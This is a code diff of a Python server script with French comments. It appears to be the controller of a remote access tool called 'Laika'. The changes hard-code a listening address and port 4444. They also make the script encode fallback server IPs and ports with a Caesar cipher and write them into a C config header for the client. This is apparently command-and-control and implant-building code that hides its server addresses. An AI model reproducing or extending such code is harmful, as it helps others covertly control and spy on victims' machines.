@@ -6,8 +6,8 @@ import os, sys, time
 import select
 import socket
 
-ADRESSE = socket.gethostname()
-PORT = 1337
+ADRESSE = "192.168.1.35"#socket.gethostname()
+PORT = 4444 
 CONNECT_CLIENTS = [] #liste des sockets ouverts
 THREAD_LIST = [] #tout les threads
 CAESAR_KEY = 5
@@ -149,20 +149,27 @@ def main() -> None :
                 print(f"\"{nb_fallbacks}\" n'est pas un nombre valide.")
                 continue
             
-            ips = []
+            ips = {} 
             for i in range(1, int(nb_fallbacks)+1) :
                 while True :
                     s_ip = input(f"IP du serveur {i} : ")
                     if "." in s_ip : #technique de shlag mais un nom de domaine peut pas être vérifié avec socket du coup on check juste le "."
-                        ips.append(CAESAR(s_ip))
+                        s_port = input(f"Port du serveur {i} : ")
+                        ips[CAESAR(s_ip)] = int(s_port)
                         break
             
             print("")
             print("Écriture de la config...")
             with open("../Laika/config.h", "w") as config :
+                config.write(f"#define FALLBACK_SERVERS {nb_fallbacks}\n\n")
                 config.write("char* fallback_servers["+nb_fallbacks+"] = {\n")
-                for ip in ips :
+                for ip in ips.keys() :
                     config.write(f"\t\"{ip}\",\n")
+                config.write("};\n\n")
+                
+                config.write("int fallback_servers_ip["+nb_fallbacks+"] = {\n")
+                for port in ips.values() :
+                    config.write(f"\t{port},\n")
                 config.write("};")
             print("Config écrite")
             
